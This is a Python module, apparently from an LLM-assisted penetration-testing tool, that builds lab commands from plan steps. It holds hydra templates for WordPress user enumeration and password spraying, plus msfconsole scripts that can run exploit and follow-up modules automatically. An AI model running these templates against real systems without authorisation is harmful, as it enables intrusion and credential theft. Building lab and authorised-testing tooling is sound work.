"""Suggest lab commands from PathStep without trusting free-form LLM shell."""

from __future__ import annotations

import os
import shlex
from pathlib import Path

from V5.models import PathStep
from V5.runtime.allowlist import _is_exploit_family, _normalize_tool
from V5.runtime.wordlists import resolve_lab_wordlist

CredentialPair = tuple[str, str]

# WordPress failed logins render <div id="login_error">. "Invalid" only appears for
# unknown users, so F=Invalid treats every wrong password for a valid user as a hit.
WP_LOGIN_FORM = (
    '"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=login_error"'
)
WP_USER_ENUM_FORM = (
    '"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=Invalid username"'
)

# Tools for which we ship a deterministic auto-run template (non-exploit).
TEMPLATED_AUTORUN_TOOLS: frozenset[str] = frozenset(
    {
        "nmap",
        "curl",
        "dirb",
        "wpscan",
        "hydra",
    }
)


def has_autorun_template(tool: str, *, allow_auto_exploits: bool = False) -> bool:
    normalized = _normalize_tool(tool)
    if _is_exploit_family(normalized):
        return bool(allow_auto_exploits)
    return normalized in TEMPLATED_AUTORUN_TOOLS


def suggest_command(
    step: PathStep,
    *,
    for_auto_exploit: bool = False,
    credentials: list[CredentialPair] | None = None,
    followup_module: str | None = None,
) -> str:
    tool = _normalize_tool(step.tool)
    ip = step.target_ip
    port = step.port

    if tool == "nmap":
        if port:
            return f"nmap -sV -Pn -p {port} {ip}"
        return f"nmap -sV --version-light -Pn {ip}"

    if tool == "curl":
        scheme = "https" if port in {443, 8443} else "http"
        port_part = f":{port}" if port else ""
        return f"curl -I --max-time 10 {scheme}://{ip}{port_part}/"

    if tool == "dirb":
        scheme = "https" if port in {443, 8443} else "http"
        port_part = f":{port}" if port else ""
        return f"dirb {scheme}://{ip}{port_part}/ -S -r"

    if tool == "wpscan":
        scheme = "https" if port in {443, 8443} else "http"
        port_part = f":{port}" if port else ""
        return f"wpscan --url {scheme}://{ip}{port_part}/ --enumerate u,vp,vt"

    if tool == "hydra":
        hydra_mod = _hydra_module(step)
        hydra_port = _hydra_port(step, hydra_mod)
        users = resolve_lab_wordlist("users")
        passwords = resolve_lab_wordlist("passwords")
        port_flag = f"-s {hydra_port} " if hydra_port else ""
        if hydra_mod in {"http-get", "https-get"}:
            hydra_mod = "http-post-form" if hydra_mod == "http-get" else "https-post-form"
            return (
                f"hydra -I -t 4 {port_flag}-L {users} -P {passwords} {ip} {hydra_mod} "
                f"{WP_LOGIN_FORM} # REVIEW: lab wordlists"
            )
        return (
            f"hydra -I -t 4 {port_flag}-L {users} -P {passwords} {ip} {hydra_mod} "
            f"# REVIEW: lab wordlists required; promoted tools only"
        )

    if _is_exploit_family(tool) or tool.startswith("exploit/") or "/" in tool:
        return _msfconsole_command(
            step.tool,
            ip,
            port,
            for_auto_exploit=for_auto_exploit,
            credentials=credentials,
            followup_module=followup_module,
        )

    if tool in {"john", "hashcat"}:
        return f"{tool} <hashfile>  # human-assisted; provide lab hash file"

    if tool == "ssh":
        return f"ssh user@{ip}" + (f" -p {port}" if port else "")

    return f"# manual step: tool={step.tool} target={ip} port={port} fact={step.produces_fact}"


def _hydra_module(step: PathStep) -> str:
    """Map a PathStep service/port to a real Hydra module (bare 'http' is invalid)."""
    service = (step.service or "").lower()
    port = step.port
    if any(token in service for token in ("http", "https", "wordpress", "www")):
        if port in {443, 8443} or "https" in service:
            return "https-get"
        return "http-get"
    if "ssh" in service or port == 22:
        return "ssh"
    if "ftp" in service or port == 21:
        return "ftp"
    if port in {443, 8443}:
        return "https-get"
    if port in {80, 8080}:
        return "http-get"
    return service or "ssh"


def _hydra_port(step: PathStep, hydra_mod: str) -> int | None:
    """Ignore LLM port/service mismatches (e.g. HTTP hydra on 22)."""
    if hydra_mod in {"http-get", "http-post-form", "http-head"}:
        if step.port in {80, 8080, 8000}:
            return step.port
        return 80
    if hydra_mod in {"https-get", "https-post-form"}:
        if step.port in {443, 8443}:
            return step.port
        return 443
    if hydra_mod == "ssh":
        return 22 if step.port in {None, 22} else step.port
    if hydra_mod == "ftp":
        return 21 if step.port in {None, 21} else step.port
    return step.port


def compile_autorun_command(
    step: PathStep,
    *,
    allow_auto_exploits: bool = False,
    credentials: list[CredentialPair] | None = None,
    followup_module: str | None = None,
) -> str | None:
    """Return an executable command string, or None if not auto-runnable."""

    tool = _normalize_tool(step.tool)
    if _is_exploit_family(tool):
        if not allow_auto_exploits:
            return None
        return suggest_command(
            step,
            for_auto_exploit=True,
            credentials=credentials,
            followup_module=followup_module,
        )

    if not has_autorun_template(step.tool, allow_auto_exploits=allow_auto_exploits):
        return None
    suggested = suggest_command(step, credentials=credentials, followup_module=followup_module)
    # Strip review comments for execution
    command = suggested.split("#", 1)[0].strip()
    if not command:
        return None
    return command


def compile_hydra_command(
    step: PathStep,
    *,
    phase: str = "password",
    users: list[str] | None = None,
    passwords_file: str | None = None,
) -> str:
    """Build a WP Hydra command: user enum (F=Invalid username) or password spray."""
    ip = step.target_ip
    hydra_mod = _hydra_module(step)
    hydra_port = _hydra_port(step, hydra_mod)
    port_flag = f"-s {hydra_port} " if hydra_port else ""
    if hydra_mod in {"http-get", "https-get"}:
        hydra_mod = "http-post-form" if hydra_mod == "http-get" else "https-post-form"
    elif hydra_mod in {"http-post-form", "https-post-form"}:
        pass
    else:
        hydra_mod = "http-post-form"

    if phase == "enum":
        users_file = resolve_lab_wordlist("users")
        return (
            f"hydra -I -t 4 {port_flag}-L {users_file} -p x {ip} {hydra_mod} "
            f"{WP_USER_ENUM_FORM}"
        )

    safe_users = [_msf_literal(user) for user in (users or []) if user]
    if len(safe_users) == 1:
        login_flag = f"-l {safe_users[0]} "
    elif safe_users:
        found = Path("lab_users.found.txt")
        found.write_text("\n".join(safe_users) + "\n", encoding="utf-8")
        login_flag = f"-L {found} "
    else:
        login_flag = f"-L {resolve_lab_wordlist('users')} "
    passwords = passwords_file or resolve_lab_wordlist("passwords")
    return (
        f"hydra -I -t 4 {port_flag}{login_flag}-P {passwords} {ip} {hydra_mod} "
        f"{WP_LOGIN_FORM}"
    )


def module_needs_login_credentials(tool: str) -> bool:
    """True when the MSF module requires USERNAME/PASSWORD (authenticated WP admin)."""
    lowered = tool.lower()
    return "wp_admin" in lowered or "wordpress_admin" in lowered


def _msfconsole_command(
    module: str,
    ip: str,
    port: int | None,
    *,
    for_auto_exploit: bool,
    credentials: list[CredentialPair] | None,
    followup_module: str | None = None,
) -> str:
    statements = [f"use {module}", f"set RHOSTS {ip}"]
    if port:
        statements.append(f"set RPORT {port}")
    lhost = os.environ.get("AUTOPLAN_LHOST", "").strip()
    if lhost:
        statements.append(f"set LHOST {lhost}")
    if credentials and module_needs_login_credentials(module):
        username, password = credentials[0]
        statements.append(f"set USERNAME {_msf_literal(username)}")
        statements.append(f"set PASSWORD {_msf_literal(password)}")
    statements.append("check")
    if for_auto_exploit:
        statements.append("run")
        if followup_module:
            statements.append(f"use {followup_module}")
            statements.append("set SESSION 1")
            statements.append("run")
        statements.append("exit")
    script = "; ".join(statements)
    if for_auto_exploit:
        return f"msfconsole -q -x {shlex.quote(script)}"
    return f"msfconsole -q -x {shlex.quote(script)} # run manually after review"


def _msf_literal(value: str) -> str:
    """Keep MSF set-values from breaking the -x script."""
    return "".join(ch for ch in value if ch not in ";\n\r")
